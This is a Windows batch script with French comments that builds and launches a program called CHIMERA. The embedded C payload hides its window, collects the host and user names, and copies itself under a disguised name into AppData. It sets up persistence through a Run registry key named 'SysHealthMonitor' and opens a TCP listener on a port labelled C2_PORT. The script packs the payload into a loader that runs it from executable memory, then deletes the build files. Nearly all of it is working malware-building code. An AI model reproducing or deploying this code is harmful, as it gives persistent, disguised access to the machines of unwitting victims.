@echo off
setlocal enabledelayedexpansion

::==================================================
:: GENESIS.BAT - L'AUTO-GÉNÉRATION DE CHIMÈRE
:: Un fichier pour tout créer.
::==================================================

echo [GENESIS] Initialisation de l'auto-generation...
echo.

:: Étape 1: Le chargeant (payload) est écrit dans le script lui-même
echo [GENESIS] Generation du code source du chargeant...
set "payload_src="
for /f "usebackq delims=" %%A in (
    'findstr /R /C:"^^::PAYLOAD_LINE " "%~f0"'
) do (
    set "payload_src=!payload_src!%%A"
)
set "payload_src=!payload_src:*: =!"

:: Écriture du fichier payload.c
(
echo !payload_src!
) > payload.c

:: Étape 2: Compilation du chargeant
echo [GENESIS] Compilation du chargeant (payload.c)...
cl payload.c /link /LTCG /Fe:payload_temp.exe user32.lib advapi32.lib shell32.lib wininet.lib ws2_32.lib iphlpapi.lib >nul 2>&1
if not exist payload_temp.exe (
    echo [ERREUR] La compilation du chargeant a echoue. Verifiez l'invite de commandes pour les developpeurs.
    pause
    exit /b
)

:: Étape 3: Transformation en donnees hexadecimales
echo [GENESIS] Transformation en donnees hexadecimales...
powershell -Command "$bytes = [System.IO.File]::ReadAllBytes('payload_temp.exe'); $hex = $bytes | ForEach-Object { '0x{0:X2}' -f $_ }; $joinedHex = $hex -join ', '; Set-Content -Path 'payload_data.h' -Value $joinedHex"

:: Étape 4: Generation du chargeur final (loader)
echo [GENESIS] Generation du code source du chargeur final...
(
echo #include ^^<windows.h^^>
echo.
echo unsigned char payload[] = {
echo.
type payload_data.h
echo.
echo ^^};
echo.
echo int main(void^^) {
echo     ShowWindow(GetConsoleWindow^^(^^), SW_HIDE^^);
echo     void *exec_mem = VirtualAlloc^^(0, sizeof^^(payload^^), MEM_COMMIT ^^| MEM_RESERVE, PAGE_EXECUTE_READWRITE^^);
echo     memcpy^^(exec_mem, payload, sizeof^^(payload^)^);
echo     HANDLE hThread = CreateThread^^(0, 0, ^^(LPTHREAD_START_ROUTINE^^)exec_mem, 0, 0, 0^^);
echo     WaitForSingleObject^^(hThread, INFINITE^^);
echo     return 0;
echo ^^}
) > loader_autogen.c

:: Étape 5: Compilation du chargeur final
echo [GENESIS] Compilation du chargeur final...
cl loader_autogen.c /link /LTCG /Fe:CHIMERA.exe >nul 2>&1
if not exist CHIMERA.exe (
    echo [ERREUR] La compilation du chargeur final a echoue.
    pause
    exit /b
)

:: Étape 6: Nettoyage
echo [GENESIS] Nettoyage des fichiers temporaires...
del payload.c payload_temp.exe payload_data.h loader_autogen.c loader_autogen.obj >nul 2>&1

echo.
echo ========================================
echo   CHIMERA.exe est pret.
echo   L'agent a ete genere avec succes.
echo ========================================
echo.
echo Lancement de CHIMERA...
start "" CHIMERA.exe
timeout /t 2 >nul
echo Termine.
pause
goto :eof

::==================================================
:: CODE SOURCE DU CHARGEANT (PAYLOAD)
:: Chaque ligne doit commencer par "::PAYLOAD_LINE "
::==================================================
::PAYLOAD_LINE #include <winsock2.h>
::PAYLOAD_LINE #include <windows.h>
::PAYLOAD_LINE #include <stdio.h>
::PAYLOAD_LINE #include <tlhelp32.h>
::PAYLOAD_LINE #include <shlobj.h>
::PAYLOAD_LINE #include <wininet.h>
::PAYLOAD_LINE #include <ws2tcpip.h>
::PAYLOAD_LINE #pragma comment(lib, "ws2_32.lib")
::PAYLOAD_LINE #pragma comment(lib, "wininet.lib")
::PAYLOAD_LINE #pragma comment(lib, "advapi32.lib")
::PAYLOAD_LINE #pragma comment(lib, "shell32.lib")
::PAYLOAD_LINE #pragma comment(lib, "iphlpapi.lib")
::PAYLOAD_LINE #define LOG_PATH "C:\\syshealth.log"
::PAYLOAD_LINE #define C2_PORT 7777
::PAYLOAD_LINE typedef struct { char host[256]; char user[256]; DWORD pid; char ip[16]; } HOST_INFO;
::PAYLOAD_LINE HOST_INFO hinfo;
::PAYLOAD_LINE void write_log(const char* msg) { FILE* log_f = fopen(LOG_PATH, "a"); if (log_f) { fprintf(log_f, "[%lu] %s\n", GetTickCount(), msg); fclose(log_f); } }
::PAYLOAD_LINE void get_host_details() { DWORD s = 256; GetComputerName(hinfo.host, &s); s = 256; GetUserName(hinfo.user, &s); hinfo.pid = GetCurrentProcessId(); strcpy(hinfo.ip, "127.0.0.1"); write_log("Host info gathered."); }
::PAYLOAD_LINE void setup_service() { write_log("Setting up persistence."); char p[MAX_PATH], t[MAX_PATH]; GetModuleFileName(NULL, p, MAX_PATH); SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, t); strcat(t, "\\Microsoft\\Windows\\"); CreateDirectory(t, NULL); strcat(t, "core_sys.exe"); CopyFile(p, t, FALSE); HKEY k; if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &k) == ERROR_SUCCESS) { RegSetValueEx(k, "SysHealthMonitor", 0, REG_SZ, (BYTE*)t, strlen(t) + 1); RegCloseKey(k); } write_log("Persistence established."); }
::PAYLOAD_LINE DWORD WINAPI com_listener_tcp(LPVOID param) { WSADATA w; WSAStartup(MAKEWORD(2,2), &w); SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); struct sockaddr_in a; a.sin_family = AF_INET; a.sin_addr.s_addr = htonl(INADDR_ANY); a.sin_port = htons(C2_PORT); bind(s, (struct sockaddr*)&a, sizeof(a)); listen(s, 1); write_log("TCP listener started."); while(1) { SOCKET cs = accept(s, NULL, NULL); char buf[256]; while(recv(cs, buf, sizeof(buf), 0) > 0) { if(strstr(buf, "status")) { char resp[256]; sprintf(resp, "OK | Uptime: %lu\n", GetTickCount()); send(cs, resp, strlen(resp), 0); } } closesocket(cs); } return 0; }
::PAYLOAD_LINE void main() { get_host_details(); setup_service(); CreateThread(NULL, 0, com_listener_tcp, NULL, 0, NULL); write_log("SYSCORE module fully active."); while(1) { Sleep(30000); } }